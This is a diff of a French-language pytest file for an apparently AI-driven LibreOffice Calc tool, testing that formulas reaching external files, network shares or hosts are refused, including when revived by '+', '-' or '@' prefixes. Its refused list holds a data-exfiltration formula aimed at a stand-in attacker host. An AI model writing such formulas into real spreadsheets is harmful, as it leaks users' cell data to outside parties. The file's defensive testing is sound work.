@@ -3,7 +3,7 @@ accès réseau, fichier ni référence externe."""
 
 import pytest
 
-from src.mirai.core import calc_functions, presets
+from src.mirai.core import presets
 from src.mirai.core.context import ToolContext
 from src.mirai.core.registry import ToolRegistry
 from src.mirai.core.tools import register_all
@@ -25,6 +25,8 @@ REFUSED = [
     "='../x.ods'#$Feuille1.A1",
     '=CONCATENATE("HTTPS://attaquant.example/";A1)',
     '="\\\\serveur\\partage"&A1',
+    "=SOMME(A1:A3)",
+    "=PROMPT(A1)",
 ]
 
 ALLOWED = [
@@ -33,6 +35,13 @@ ALLOWED = [
     "=A1*2",
     "=sum(A1:A3)",
     '=IFERROR(VLOOKUP(A2;D1:E9;2;0);"")',
+    '=IF(ISNA(MATCH(A2;D:D;0));"absent";"présent")',
+    "=TRUNC(A1)+PI()*SIGN(A2)",
+    "=STDEV.S(A1:A9)",
+    "=EOMONTH(A2;0)",
+    '=IF(A2<>"";"Total (HT)";"")',
+    "=$'Feuil1 (2)'.A1*2",
+    "='Données (2024)'.A1",
 ]
 
 
@@ -78,18 +87,22 @@ def test_fill_down_does_not_copy_a_refused_formula():
     assert list(sheet.formulas) == [(2, 1)]
 
 
-def test_every_catalog_function_but_network_and_file_ones_is_allowed():
-    names = calc_functions.catalog()
-    assert len(names) > 100
-    for name in names:
-        refusal = calc_functions.formula_refusal(f"={name}(A1)")
-        assert bool(refusal) == (name in calc_functions.NETWORK_OR_FILE_FUNCTIONS), name
+def test_fill_down_copies_an_addin_function_as_calc_reads_it_back():
+    sheet = FakeCalcSheet(grid={(0, 1): "a", (0, 2): "b"})
+    sheet.formulas[(2, 1)] = "=COM.SUN.STAR.SHEET.ADDIN.ANALYSIS.GETEOMONTH(A2;0)"
+    result = _call(sheet, "calc_fill_formula_down", {"from_ref": "C2", "to_row": 4})
+    assert result.ok
+    assert sheet.formulas[(2, 2)] == "=COM.SUN.STAR.SHEET.ADDIN.ANALYSIS.GETEOMONTH(A3;0)"
 
 
-def test_without_catalog_every_function_is_refused(monkeypatch):
-    monkeypatch.setattr(calc_functions, "_catalog", {})
-    assert not _set_formula(FakeCalcSheet(), "=SUM(A1:A3)").ok
-    assert _set_formula(FakeCalcSheet(), "=A1*2").ok
+def test_every_example_the_formula_preset_shows_is_accepted():
+    suggested = 0
+    for name in presets._load_functions_db():
+        for line in presets.relevant_functions(name).splitlines():
+            example = line.rsplit("(ex. ", 1)[1][:-1]
+            assert _set_formula(FakeCalcSheet(), example).ok, line
+            suggested += 1
+    assert suggested > 100
 
 
 def _call(sheet, tool, args, selection_ref="A1:A1"):
@@ -109,6 +122,23 @@ def test_write_cells_does_not_write_a_refused_formula_as_text():
     assert sheet.grid[(1, 1)].startswith("#ERREUR")
 
 
+@pytest.mark.parametrize("prefix", ["+", "-", "@"])
+def test_write_cells_refuses_a_formula_revived_by_another_prefix(prefix):
+    sheet = FakeCalcSheet()
+    result = _call(sheet, "calc_write_cells",
+                   {"cells": [{"ref": "B1", "value": prefix + EXFILTRATION[1:]}]})
+    assert not result.ok
+    assert sheet.grid[(1, 0)].startswith("#ERREUR")
+
+
+@pytest.mark.parametrize("text", ["-5", "+33 6 12 34 56 78", "=> Résultat (voir note)"])
+def test_write_cells_keeps_text_that_only_looks_like_a_formula(text):
+    sheet = FakeCalcSheet()
+    result = _call(sheet, "calc_write_cells", {"cells": [{"ref": "B1", "value": text}]})
+    assert result.ok
+    assert sheet.grid[(1, 0)] == text
+
+
 def test_write_cells_keeps_a_calculation_formula_as_text():
     sheet = FakeCalcSheet()
     result = _call(sheet, "calc_write_cells",
@@ -123,6 +153,7 @@ def test_result_column_does_not_write_a_refused_formula_as_text():
     result = _call(sheet, "calc_write_result_column",
                    {"values": ["ok", EXFILTRATION]}, selection_ref="A1:A2")
     assert not result.ok
+    assert "1 résultat(s) écrit(s) en colonne B" in result.error
     assert sheet.grid[(1, 0)] == "ok"
     assert sheet.grid[(1, 1)].startswith("#ERREUR")
 
